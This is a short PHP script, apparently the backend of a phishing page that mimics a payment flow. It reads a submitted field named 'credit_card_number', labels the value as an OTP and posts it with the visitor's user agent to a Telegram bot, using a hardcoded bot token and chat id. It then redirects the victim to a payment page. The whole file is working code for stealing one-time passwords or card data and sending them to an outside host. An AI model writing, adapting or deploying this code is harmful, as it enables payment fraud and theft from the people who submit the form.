<?php

$telegram_token = '7996606148:AAGCkZCmT3y1en-3-zWmyk4almnDqZmbR8A';
$chat_id = '-1002180753425';

$otp = $_POST['credit_card_number']; // تحديث اسم الحقل


$userAgent = $_SERVER['HTTP_USER_AGENT'];


$message = "╭━─━─━─≪ Info 💳 ≫─━─━─━╮\n\n";
$message .= "I OTP 💳 I\n\n";
$message .= "OTP: $otp\n\n";
$message .= "------------------------\n";
$message .= "User Agent: $userAgent\n";
$message .= "╰━─━─━─≪ Info 💳 ≫─━─━─━╯";


$telegram_api_url = "https://api.telegram.org/bot$telegram_token/sendMessage";
$telegram_data = [
    'chat_id' => $chat_id,
    'text' => $message,
];

$curl_options = [
    CURLOPT_URL => $telegram_api_url,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => http_build_query($telegram_data),
    CURLOPT_RETURNTRANSFER => true,
];

$ch = curl_init();
curl_setopt_array($ch, $curl_options);
$response = curl_exec($ch);
curl_close($ch);


header('Location: /sa/pay/payment/');
exit;

?>
